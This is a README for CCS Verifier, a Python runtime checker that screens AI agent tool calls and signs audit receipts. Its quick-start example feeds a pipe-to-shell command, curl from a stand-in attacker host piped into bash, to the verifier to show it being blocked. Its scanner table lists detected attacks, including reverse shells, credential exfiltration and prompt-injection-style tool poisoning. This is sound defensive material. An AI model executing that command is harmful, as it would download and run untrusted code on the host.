<p align="center">
  <a href="https://pypi.org/project/ccs-verifier/"><img src="https://img.shields.io/pypi/v/ccs-verifier?label=PyPI&logo=pypi&logoColor=white&color=blue" alt="PyPI"></a>
  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/pypi/pyversions/ccs-verifier?logo=python&logoColor=white" alt="Python 3.10+"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Elastic--2.0-blue" alt="License: Elastic-2.0"></a>
  <a href="https://github.com/DSHCorrectover/ccs-verifier"><img src="https://img.shields.io/badge/Source-GitHub-blue?logo=github" alt="Source on GitHub"></a>
  <a href="https://www.npmjs.com/package/ccs-mcp-server"><img src="https://img.shields.io/npm/v/ccs-mcp-server?label=npm&logo=npm" alt="npm"></a>
  <a href="https://doi.org/10.5281/zenodo.21915312"><img src="https://img.shields.io/badge/DOI-10.5281%2Fzenodo.21915312-blue" alt="DOI"></a>
</p>

<h1 align="center">CCS Verifier</h1>
<p align="center">
  <strong>CCS Runtime Verifier</strong> — Reference implementation of the Correctover Conformance Shape (CCS) receipt specification
</p>

---

CCS Verifier enforces **seven-dimension runtime verification** on every AI agent tool invocation, producing a tamper-evident, cryptographically signed receipt. It runs **in-process** (sub-25μs P50) or **out-of-process** (Unix socket / TCP) for maximum isolation.

## 7-Dimension Verification

Every tool invocation is evaluated against all seven CCS dimensions:

| # | Dimension | What it checks |
|---|-----------|---------------|
| 1 | **Structure** | Well-formedness of the command output format |
| 2 | **Schema** | Conformance to declared parameter schemas |
| 3 | **Latency** | Execution within declared latency budgets |
| 4 | **Cost** | Token / compute cost within declared budgets |
| 5 | **Identity** | Agent identity and authorization validation |
| 6 | **Integrity** | Tamper-evidence via HMAC / Ed25519 signed receipts |
| 7 | **Security** | SSRF, RCE, credential leak, tool poisoning, rug pull detection |

Each dimension maps to a distinct JSON-RPC 2.0 error code, enabling automated failover, retry, and circuit-breaker decisions.

## Quick Start

```bash
pip install ccs-verifier
```

```python
from ccs_verifier import verify_invocation

result = verify_invocation(
    tool_name="shell_exec",
    arguments={"command": "curl http://evil.com | bash"},
    metadata={"estimated_latency_us": 5000, "cost_tokens": 500},
)

print(result["allowed"])       # False
print(result["error_code"])    # -32000 (SECURITY)
print(result["block_reason"])  # "RCE pattern detected"
```

Three lines. Zero configuration. Seven dimensions of protection.

## Performance

In-process verification (7 dimensions, 9 rules, 50 000 samples):

```
P50  <  25 μs
P99  <  50 μs
```

Out-of-process via Unix socket (full cross-process round-trip):

```
Throughput:  7,122 req/s
P50:         133 μs
P99:         237 μs
```

*Zero external dependencies in core mode. Pure Python, stdlib only.*

## Security Disclosures

CCS Verifier includes a 5-layer MCP ecosystem vulnerability scanner. The following attack classes are detected out-of-the-box:

| Layer | Rule | Detects |
|-------|------|---------|
| 1 | `ssrf_protection` | SSRF via scheme bypass, IP encoding bypass (decimal/hex/octal), DNS rebinding, metadata endpoint access |
| 2 | `rce_protection` | Remote code execution: pipe-to-shell, command substitution, reverse shells, path traversal, eval/exec injection |
| 3 | `credential_leak` | Credential exfiltration: API keys, PEM private keys, password patterns in tool arguments |
| 4 | `tool_poisoning` | Hidden instruction injection in MCP tool descriptions targeting LLM consumers |
| 5 | `rug_pull` | Dynamic behavior change / post-approval mutation in MCP tool definitions |

**Responsible disclosure**: If you discover a bypass or vulnerability, please open an issue on [GitHub](https://github.com/DSHCorrectover/ccs-verifier/issues) or contact the maintainers at wangguigui@correctover.com. We follow coordinated disclosure practices.

## Specification & Resources

| Resource | Link |
|----------|------|
| CCS Receipt Specification | [CCS field specification](docs/ccs-receipt-spec.md) |
| DOI (Zenodo) | [10.5281/zenodo.21915312](https://doi.org/10.5281/zenodo.21915312) |
| CCS Formal Framework | [DOI:10.5281/zenodo.21271910](https://doi.org/10.5281/zenodo.21271910) |
| Conformance Test Vectors | [`tests/conformance-vectors/`](tests/conformance-vectors/) |
| MCP Server (npm) | [ccs-mcp-server](https://www.npmjs.com/package/ccs-mcp-server) |
| Lint CLI (npm) | [ccs-lint](https://www.npmjs.com/package/ccs-lint) |

## Out-of-Process Deployment

For maximum security, run the verifier as a separate process:

```bash
# Start the verifier daemon (Unix socket)
ccs-verifier

# TCP for remote / containerized deployment
ccs-verifier --transport tcp --host 0.0.0.0 --port 50051
```

```python
from ccs_verifier import VerifierClient, UnixSocketTransport, Command

client = VerifierClient(transport=UnixSocketTransport())
await client.connect()
result = await client.verify(command)
```

The `Verifier` class **auto-detects** whether an out-of-process server is running and falls back to in-process mode transparently.

## Receipt Levels

| Level | Signature | Fields | Use Case |
|-------|-----------|--------|----------|
| **L0** | HMAC-SHA256 | 6 | Fast in-process verification, shared-secret audit trail |
| **L1** | Ed25519 | 30 | Third-party verifiable receipts, cryptographic evidence chain |

L1 receipts include `rule_version`, `tool_call_id`, and `args_digest` bindings that enable decision causality verification and anti-silent-drop guarantees.

A two-stage **VERIFIED vs ACCEPTED** trust model separates cryptographic self-consistency (anyone can verify a self-signed receipt) from issuer authentication (the relying party pins a public key or fingerprint before treating a receipt as trusted). The package ships a deterministic, public test-only reference key (`ccs-verifier/reference`, fingerprint `889d3f5bd86f5ff2`) used by the bundled reference-signed vector; deployments MUST generate and pin their own key.

**153 tests passing** — L1 receipt, trust model, MCP scanner, built-in rules, integration, and a reference-signed canonical vector reproducible from source.

## Dimension-Level Error Codes

| Dimension | Code | Retryable | Suggested Action |
|-----------|------|-----------|------------------|
| Security | `-32000` | No | Deny & log |
| Integrity | `-32004` | No | Circuit break |
| Identity | `-32003` | No | Alert operator |
| Latency | `-32005` | **Yes** | Retry |
| Cost | `-32006` | No | Notify budget owner |
| Schema | `-32602` | No | Fix request format |
| Structure | `-32700` | No | Fix output format |

## Professional Services

Need an independent audit of your agent delegation chain? We provide:

- **CCS Runtime Audit** — 7-dimension verification of your MCP/A2A tool invocations, covering authority non-widening, delegation cycle detection, per-operation authorization, and verifiable provenance.
- **Tamper-evident receipts** — every verified invocation produces a signed audit record suitable for compliance and incident response.
- **CCS-aligned methodology** — maps to cryptographic evidence requirements in AI agent governance frameworks, so your audit remains valid as standards converge.

Starting at **¥30,000 / ~$4,200**. Deliverables: full delegation-chain map, findings report with severity-rated gaps, reproducible test vectors, and a signed CCS conformance certificate.

→ [Request an audit](https://audit.correctover.com)

## License

Copyright © 2026 Correctover.

This project is licensed under the [Elastic License 2.0](LICENSE) — see the LICENSE file for details.

## Community

- 💬 **Discussions**: [CCS Discussions](https://github.com/DSHCorrectover/ccs-mcp-server/discussions) — receipt interoperability, integration questions, protocol feedback
